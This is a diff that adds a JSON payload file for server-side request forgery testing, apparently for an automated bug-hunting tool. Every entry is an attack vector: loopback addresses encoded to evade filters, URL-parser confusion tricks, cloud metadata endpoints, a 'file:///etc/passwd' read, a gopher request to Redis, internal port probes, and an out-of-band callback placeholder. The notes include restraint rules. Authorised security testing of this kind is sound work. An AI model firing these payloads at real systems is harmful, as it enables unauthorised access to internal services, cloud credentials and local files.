@@ -1,0 +1,24 @@
+{
+  "class": "ssrf",
+  "order": "bypass-first",
+  "note": "Filter-evasion first (IP spellings, parser confusion), then direct internal targets. Blind SSRF: replace host with {OOB} probe URL and hunter_oob_poll. NEVER exfiltrate cloud metadata contents; a 200/title on the metadata IP is already a finding.",
+  "payloads": [
+    { "id": "ssrf::01", "vector": "http://127.1", "note": "shortened loopback — parser normalization gaps" },
+    { "id": "ssrf::02", "vector": "http://0x7f000001", "note": "hex IP" },
+    { "id": "ssrf::03", "vector": "http://2130706433", "note": "decimal IP" },
+    { "id": "ssrf::04", "vector": "http://0177.0.0.1", "note": "octal IP" },
+    { "id": "ssrf::05", "vector": "http://[::1]", "note": "IPv6 loopback" },
+    { "id": "ssrf::06", "vector": "http://127.0.0.1.nip.io", "note": "DNS-name form of loopback (resolves to 127.0.0.1)" },
+    { "id": "ssrf::07", "vector": "http://expected-host@127.0.0.1:80", "note": "userinfo@ parser confusion — host auth first" },
+    { "id": "ssrf::08", "vector": "http://expected-host#@127.0.0.1", "note": "fragment confusion variant" },
+    { "id": "ssrf::09", "vector": "http://{OOB}", "note": "blind probe — DNS/HTTP callback to listener" },
+    { "id": "ssrf::10", "vector": "http://169.254.169.254/latest/", "note": "AWS metadata — title/200 only, NEVER read contents" },
+    { "id": "ssrf::11", "vector": "http://169.254.169.254/metadata/instance", "note": "Azure metadata (needs header, so 404 is expected unless proxy bug)" },
+    { "id": "ssrf::12", "vector": "http://metadata.google.internal/computeMetadata/v1/", "note": "GCP metadata" },
+    { "id": "ssrf::13", "vector": "file:///etc/passwd", "note": "file scheme — only where URL fetcher allows it" },
+    { "id": "ssrf::14", "vector": "gopher://127.0.0.1:6379/_INFO", "note": "gopher if supported — proves full request smuggling from SSRF" },
+    { "id": "ssrf::15", "vector": "http://internal-service:8080/", "note": "common internal ports: 8080,8000,9090,5432 — keep volume low" },
+    { "id": "ssrf::16", "vector": "http://127.0.0.1%2523@{OOB}", "note": "encoded fragment + OOB exfil of fetch behavior" },
+    { "id": "ssrf::17", "vector": "http://[0:0:0:0:0:ffff:127.0.0.1]", "note": "IPv4-mapped IPv6" }
+  ]
+}
